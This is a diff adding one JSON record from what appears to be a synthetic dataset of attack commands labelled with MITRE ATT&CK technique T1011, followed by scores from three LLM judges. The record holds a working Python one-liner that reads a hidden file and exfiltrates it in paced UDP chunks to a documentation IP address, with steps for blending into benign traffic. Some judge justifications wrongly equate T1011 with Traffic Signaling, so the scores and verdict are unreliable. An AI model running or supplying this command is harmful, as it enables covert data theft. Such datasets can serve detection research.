@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
+  "explanation": "Uses paced UDP bursts on a high, uncommon port to simulate an alternate low-profile datagram medium instead of a typical TCP C2 stream, satisfying T1011.",
+  "rationale_steps": [
+    "Open a UDP socket to an uncommon port (49444) on a documentation IP.",
+    "Chunk and time-gap transmissions to blend with benign datagram traffic.",
+    "Utilize UDP as an alternative exfil medium distinct from primary TCP channels.",
+    "No obfuscation; user-level compatible."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-d2d56269",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid imports and socket calls, and proper semicolon-separated statements.",
+        "semantic_score": 2,
+        "semantic_justification": "It sends file contents over UDP with fixed delays (exfiltration) rather than embedding signals/commands in legitimate-looking traffic or covert fields, so it largely misaligns with T1011 Traffic Signaling.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:22:36.296509Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, using proper syntax for imports, variable assignments, list comprehension, and function calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by reading data from a hidden file and exfiltrating it via UDP in small chunks with timed intervals (traffic signaling), using an uncommon high port to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:22:39.433905Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and valid Python syntax for all operations within the string executed by `python3 -c`.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements paced UDP bursts using an uncommon high port, exhibiting timing patterns and consistent packet sizes to transfer data, which directly aligns with the characteristics and examples of Traffic Signaling (T1011).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:22:54.850886Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
